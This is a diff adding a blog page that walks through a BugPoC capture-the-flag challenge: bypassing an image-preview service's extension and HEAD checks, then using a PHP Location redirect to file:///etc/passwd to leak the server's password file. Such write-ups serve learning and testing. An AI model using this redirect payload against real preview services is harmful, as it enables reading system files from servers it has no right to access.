@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>BUGPOC LFI Challenge</title>
+  <meta name="description" content="Building n Breaking">
+
+  <!-- Social: Twitter -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:site" content="@D4r3_D3v1L_">
+  <meta name="twitter:title" content="BUGPOC LFI Challenge">
+  <meta name="twitter:description" content="Building n Breaking">
+  
+  <meta property="twitter:image:src" content="http://localhost:4000/potato-hacker-theme/assets/img/opengraph.png">
+  
+
+  <!-- Social: Facebook / Open Graph -->
+  <meta property="og:url" content="http://localhost:4000/potato-hacker-theme/blog/2020/10/08/bugpoc.html">
+  <meta property="og:title" content="BUGPOC LFI Challenge">
+  
+  <meta property="og:image" content="http://localhost:4000/potato-hacker-theme/assets/img/opengraph.png">
+  
+  <meta property="og:description" content="Building n Breaking">
+  <meta property="og:site_name" content="jekyll-theme-potato-hacker">
+
+  <!-- Social: Schema.org  -->
+  <meta itemprop="name" content="BUGPOC LFI Challenge"/>
+  <meta itemprop="description" content="Building n Breaking">
+  <meta itemprop="image" content="http://localhost:4000/potato-hacker-theme/assets/img/opengraph.png"/>
+
+  <!-- Favicon -->
+  <link rel="shortcut icon" href="/potato-hacker-theme/assets/img/icons/favicon.ico" type="image/x-icon" />
+
+  <!-- Android Lolipop Theme Color -->
+  <meta name="theme-color" content="#2a4d14">
+
+  <!-- Styles -->
+  <link rel="stylesheet" id="css-theme" href="/potato-hacker-theme/assets/css/main-dark.css">
+  <link rel="stylesheet" href="/potato-hacker-theme/assets/css/highlight/gruvbox.css">
+  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
+  <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet">
+
+  <!-- Javascript -->
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/d3/4.3.0/d3.min.js"></script>
+  <script type="text/javascript" src="/potato-hacker-theme/assets/js/main.js"></script>
+</head>
+
+
+<body class="animated fadeIn">
+  <div class="container">
+    <div id="background-div">
+      <svg id="background-svg">
+        <lineargradient id="Gradient1" x1="0" x2="0" y1="0" y2="1">
+          <stop stop-opacity="0" class="bgColor2" offset="0%" />
+          <stop stop-opacity="0.5" class="bgColor2" offset="10%" />
+          <stop stop-opacity="0.5" class="bgColor1" offset="40%" />
+          <stop stop-opacity="0" class="bgColor1" offset="100%" />
+        </lineargradient>
+        <g id="bg-layer1"></g>
+        <g id="bg-layer2" class="hide"></g>
+        <g id="bg-layer3"></g>
+        <g id="bg-layer4"></g>
+      </svg>
+    </div>
+    <section class="header">
+      <header>
+	<div class="row">
+		<div class="col-xs-12">
+			<nav class="navbar navbar-default navbar-fixed-top">
+				<div class="container">
+					<div class="navbar-header">
+						<a
+							class="navbar-toggle collapsed navbar-icon"
+							data-toggle="collapse"
+							data-target="#bs-example-navbar-collapse-1"
+						>
+							<i class="fa fa-bars fa-2x"></i>
+						</a>
+						<a
+							class="navbar-brand navbar-icon"
+							href="/potato-hacker-theme/"
+						>
+							<i class="fa fa-home fa-2x"></i>
+						</a>
+					</div>
+
+					<div
+						class="collapse navbar-collapse"
+						id="bs-example-navbar-collapse-1"
+					>
+						<ul class="nav navbar-nav navbar-right">
+							<li>
+								<a href="/potato-hacker-theme/"
+									>Home</a
+								>
+							</li>
+							
+							<li>
+								<a href="/potato-hacker-theme/blog"
+									>Blog</a
+								>
+							</li>
+							
+
+							<!-- 
+                <li class="dropdown dropdown-dropdown1">
+                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                    role="button" aria-haspopup="true" aria-expanded="false">dropdown1
+                    <span class="caret"></span>
+                  </a>
+                  <ul class="dropdown-menu dropdown-menu-item1">
+                    <li priority="1"><a href="/potato-hacker-theme/dropdown/dropdown1_item1.html">item1</a></li>
+                  </ul>
+                </li>
+              
+                <li class="dropdown dropdown-dropdown1">
+                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                    role="button" aria-haspopup="true" aria-expanded="false">dropdown1
+                    <span class="caret"></span>
+                  </a>
+                  <ul class="dropdown-menu dropdown-menu-item2">
+                    <li priority="2"><a href="/potato-hacker-theme/dropdown/dropdown1_item2.html">item2</a></li>
+                  </ul>
+                </li>
+              
+                <li class="dropdown dropdown-dropdown1">
+                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                    role="button" aria-haspopup="true" aria-expanded="false">dropdown1
+                    <span class="caret"></span>
+                  </a>
+                  <ul class="dropdown-menu dropdown-menu-item3">
+                    <li priority="3"><a href="/potato-hacker-theme/dropdown/dropdown1_item3.html">item3</a></li>
+                  </ul>
+                </li>
+              
+                <li class="dropdown dropdown-dropdown2">
+                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                    role="button" aria-haspopup="true" aria-expanded="false">dropdown2
+                    <span class="caret"></span>
+                  </a>
+                  <ul class="dropdown-menu dropdown-menu-item1">
+                    <li priority=""><a href="/potato-hacker-theme/dropdown/dropdown2_item1.html">item1</a></li>
+                  </ul>
+                </li>
+              
+                <li class="dropdown dropdown-dropdown2">
+                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                    role="button" aria-haspopup="true" aria-expanded="false">dropdown2
+                    <span class="caret"></span>
+                  </a>
+                  <ul class="dropdown-menu dropdown-menu-item2">
+                    <li priority=""><a href="/potato-hacker-theme/dropdown/dropdown2_item2.html">item2</a></li>
+                  </ul>
+                </li>
+              
+                <li class="dropdown dropdown-dropdown3">
+                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                    role="button" aria-haspopup="true" aria-expanded="false">dropdown3
+                    <span class="caret"></span>
+                  </a>
+                  <ul class="dropdown-menu dropdown-menu-item1">
+                    <li priority=""><a href="/potato-hacker-theme/dropdown/dropdown3_item1.html">item1</a></li>
+                  </ul>
+                </li>
+               -->
+							
+							<li class="nav-item">
+								<a
+									href="/potato-hacker-theme/items/about.html"
+									>About</a
+								>
+							</li>
+							
+
+							<script>
+								// clean repeated dropdowns and add <li> to their positions
+								let done = [];
+								let elements = [];
+								$(".dropdown")
+								  //
+								  .each((index0 , value0) => {
+								    let dropdownClass = "."+$(value0)[0].classList[1];
+								    if (done.indexOf(dropdownClass) !== -1) return
+								    done.push(dropdownClass)
+								    let dropdownMain = $(dropdownClass)[0]
+								    let itemsList = $(dropdownClass+">ul>li").sort((a, b) => parseInt(b.getAttribute("priority") || -9999999) - parseInt(a.getAttribute("priority") || -9999999))
+								    $(dropdownClass+">ul>li").remove();
+								    $(dropdownClass+">ul").append(itemsList)
+								    $(dropdownClass).remove();
+								    elements.push(dropdownMain)
+								});
+								let priority = [ "About", ];
+								elements = elements.concat(...$(".nav-item").remove())
+								priority.map(text => {
+								  elements = elements.filter(node => {
+								      let nodeText = node.querySelector("a").textContent.trim()
+								      if (text == nodeText) {
+								          $(".nav").append(node)
+								          return false;
+								      }
+								      return true;
+								  })
+								});
+								$(".nav").append(elements)
+							</script>
+						</ul>
+					</div>
+				</div>
+			</nav>
+		</div>
+	</div>
+</header>
+
+    </section>
+    <section class="content">
+      <div class="row">
+        <!-- <div class="col-sm-2">
+          <div class="pane-separator hidden-xs" style="margin-bottom:30em;"></div>
+          <div class="left-pane">
+          </div>
+        </div> -->
+        <div class="col-sm-8 col-sm-offset-2 content-div">
+          <div class="page-separator hidden-xs">
+            <h1 class="h1-strip" style="padding-bottom:8em; margin-bottom: 0;"></h1>
+          </div>
+          <div class="page-separator visible-xs">
+            <h1 class="h1-strip" style="padding-bottom:2em; margin-bottom: 0;"></h1>
+          </div>
+          <h1 class="post-title page-title" id="title"><a href="#title">BUGPOC LFI Challenge</a></h1>
+          <h4 class="post-title"> 2020-10-08 16:30:12 +0530 </h4>
+<article class="blog-post">
+  <p>BUGPOC LFI Challenge</p>
+
+<!--more-->
+
+<h2 id="bugpoc-lfi-challenge">BUGPOC LFI Challenge</h2>
+
+<h3 id="we-are-given-a-website-social-media-sharer-and-we-need-to-leak-etcpasswd">We are given a website <a href="http://social.buggywebsite.com/">Social Media Sharer</a> and We need to leak <strong>etc/passwd</strong></h3>
+
+<center><img src="1.png" /></center>
+
+<p>We can write and share posts via social accounts mentioned below</p>
+
+<p>After looking into source code there is a javascript file with some functions and some checks.</p>
+
+<p>The main function here is <strong>processUrl()</strong>.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">processUrl</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">requestTime</span> <span class="o">=</span> <span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">(),</span>
+    <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">https://api.buggywebsite.com/website-preview</span><span class="dl">"</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">t</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">;</span>
+    <span class="nx">t</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+        <span class="mi">4</span> <span class="o">==</span> <span class="nx">t</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">&amp;&amp;</span> <span class="mi">200</span> <span class="o">==</span> <span class="nx">t</span><span class="p">.</span><span class="nx">status</span> <span class="p">?</span> <span class="p">(</span><span class="nx">response</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">responseText</span><span class="p">),</span>
+        <span class="nx">populateWebsitePreview</span><span class="p">(</span><span class="nx">response</span><span class="p">))</span> <span class="p">:</span> <span class="mi">4</span> <span class="o">==</span> <span class="nx">t</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">&amp;&amp;</span> <span class="mi">200</span> <span class="o">!=</span> <span class="nx">t</span><span class="p">.</span><span class="nx">status</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">responseText</span><span class="p">),</span>
+        <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">website-preview</span><span class="dl">"</span><span class="p">).</span><span class="nx">style</span><span class="p">.</span><span class="nx">display</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">none</span><span class="dl">"</span><span class="p">)</span>
+    <span class="p">}</span>
+    <span class="p">,</span>
+    <span class="nx">t</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="o">!</span><span class="mi">0</span><span class="p">),</span>
+    <span class="nx">t</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">application/json; charset=UTF-8</span><span class="dl">"</span><span class="p">),</span>
+    <span class="nx">t</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Accept</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">application/json</span><span class="dl">"</span><span class="p">),</span>
+    <span class="nx">data</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="na">url</span><span class="p">:</span> <span class="nx">e</span><span class="p">,</span>
+        <span class="na">requestTime</span><span class="p">:</span> <span class="nx">requestTime</span>
+    <span class="p">},</span>
+    <span class="nx">t</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">data</span><span class="p">))</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>It takes url and makes a post.And then it calls <strong>populateWebsitePreview()</strong> function to fetch the og:image and its tags from the url and loads it to <strong>imgData</strong> .</p>
+
+<p><img src="2.png" alt="og:mage" /></p>
+
+<p>I crafted a html with meta tag og:image in my php server</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+	<span class="nt">&lt;head&gt;</span>
+		<span class="nt">&lt;meta</span> <span class="na">property=</span><span class="s">"og:image"</span> <span class="na">content=</span><span class="s">"/test.png"</span> <span class="nt">/&gt;</span>
+	<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>Placed the ngrok link ,and observe the response there is base64 encoded data of our image file (test.png) .And we also see the incomming requests from the server to our local server.
+Well we understand the functionality.It makes request to specified url/value which we place in the content of og:image</p>
+
+<p>If we place other than jpg,png,svg files in content we get an error <code class="language-plaintext highlighter-rouge">Image Preview Error: Invalid Image URL</code></p>
+
+<p>Lets see what checking this ..</p>
+
+<h3 id="checks-and-bypass-">Checks and Bypass :</h3>
+
+<p><strong>Check 1</strong></p>
+
+<ul>
+  <li>When we place content with image extensions , we getting a <strong>HEAD</strong> requestthen <strong>GET</strong> request which fetches the image ,If we provide any extensions other than jpg,png,svg we didn’t get any HEAD incomming request .</li>
+  <li>So the server checking the extension we placing, We can bypass this by providing <strong>double extensions</strong> like <strong>test.svg.php</strong></li>
+</ul>
+
+<p><strong>index.php</strong></p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+	<span class="nt">&lt;head&gt;</span>
+		<span class="nt">&lt;meta</span> <span class="na">property=</span><span class="s">"og:image"</span> <span class="na">content=</span><span class="s">"myserver/test.svg.php"</span> <span class="nt">/&gt;</span>
+	<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p><strong>Check 2</strong></p>
+
+<ul>
+  <li>I created a php file with named <code class="language-plaintext highlighter-rouge">test.svg.php</code> and placed it in my local server and placed the link in content of og:image andthe server returns
+<code class="language-plaintext highlighter-rouge">Image Failed HEAD Test</code></li>
+  <li>By this error we know there is a check for HEAD method , if we see what is <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/HEAD">HEAD request method</a>
+it only return Headers not reponse body .</li>
+  <li>By observing the Incomming HEAD requests for Valid file , we see that it has a <strong>Content-type</strong> for successful request .</li>
+  <li>So added <strong>Content-Type: image/svg+xml</strong> in the <code class="language-plaintext highlighter-rouge">test.svg.php</code>.We got no error there , so it happened , we bypassed HEAD check</li>
+</ul>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+	<span class="nb">header</span><span class="p">(</span><span class="s2">"Content-Type: image/svg+xml"</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+
+</code></pre></div></div>
+
+<p><strong>LFI</strong></p>
+
+<p>If we observe clearly we have a <strong>GET</strong> request after the HEAD request to fetch the image content ,so if we redirect the GET request of the image<code class="language-plaintext highlighter-rouge"> to file:///etc/passwd</code> it fetches the etc/passwd content.</p>
+
+<p>So added a <strong>Location</strong> header to <code class="language-plaintext highlighter-rouge">file://etc/passwd</code> in the above php file.</p>
+
+<p><strong>test.svg.php</strong></p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+	<span class="nb">header</span><span class="p">(</span><span class="s2">"Content-Type: image/svg+xml"</span><span class="p">);</span>
+	<span class="nb">header</span><span class="p">(</span><span class="s1">'Location: file:///etc/passwd'</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+
+</code></pre></div></div>
+
+<p>place the ngrok link and see the response.</p>
+
+<p>Guess what, 🙌 It worked and we leaked the etc/passwd</p>
+
+<p><img src="3.png" alt="etc/passwd" /></p>
+
+<center> Thanks for Reading 😇 <center>
+</center></center>
+
+</article>
+
+        </div>
+        <div class="col-sm-2">
+          <div class="pane-separator hidden-xs" style="margin-bottom:30em;"></div>
+          <div class="pane-separator visible-xs" style="margin-bottom:5em;"></div>
+          <div class="right-pane" style="margin-left: 1em;">
+            
+              <div class="avatar">
+                <center>
+                  
+                    <img src="/potato-hacker-theme/assets/img/avatar.jpg" alt="me" class="avatar-image">
+                  
+                  
+                    <p class="avatar-description">Building n Breaking Stuff</p>
+                  
+                  <div class="right-links">
+                    
+<a href="https://github.com/D4r3-D3v1L" target="_blank">
+	<i class="fa fa-github fa-2x"></i>
+</a>
+ 
+<a href="mailto:d4r3d3v1l.asp@gmail.com">
+	<i class="fa fa-envelope fa-2x"></i>
+</a>
+ 
+<a href="https://twitter.com/D4r3_D3v1L_" target="_blank">
+	<i class="fa fa-twitter fa-2x"></i>
+</a>
+ 
+<a href="https://www.linkedin.com/in/surya-prakash-akula-44bbb5190" target="_blank">
+	<i class="fa fa-linkedin fa-2x"></i>
+</a>
+
+
+                  </div>
+                </center>
+              </div>
+            
+            
+              <div class="posts-list">
+                <a href="/potato-hacker-theme/blog">
+                  <h4>Recent Posts:</h4>
+                </a>
+                <ul>
+                  
+                </ul>
+              </div>
+            
+          </div>
+        </div>
+      </div>
+    </section>
+    <section class="footer">
+      <footer class="page-footer">
+  <center>
+    
+    <div class="row">
+      <div class="col-sm-8 col-sm-offset-2">
+        <a onclick="toggleTheme();">
+          Light/Dark
+        </a>
+      </div>
+    </div>
+    
+    <div class="row">
+      <div class="col-sm-8 col-sm-offset-2">
+        
+<a href="https://github.com/D4r3-D3v1L" target="_blank">
+	<i class="fa fa-github fa-2x"></i>
+</a>
+ 
+<a href="mailto:d4r3d3v1l.asp@gmail.com">
+	<i class="fa fa-envelope fa-2x"></i>
+</a>
+ 
+<a href="https://twitter.com/D4r3_D3v1L_" target="_blank">
+	<i class="fa fa-twitter fa-2x"></i>
+</a>
+ 
+<a href="https://www.linkedin.com/in/surya-prakash-akula-44bbb5190" target="_blank">
+	<i class="fa fa-linkedin fa-2x"></i>
+</a>
+
+
+      </div>
+    </div>
+    
+    <div class="row">
+      <div class="col-sm-8 col-sm-offset-2">
+        Copyright (c) 2023 Surya -
+        <a href="mailto:d4r3d3v1l.asp@gmail.com">&lt;d4r3d3v1l.asp@gmail.com&gt;</a>
+      </div>
+    </div>
+    
+  </center>
+</footer>
+
+    </section>
+  </div>
+</body>
+
+</html>
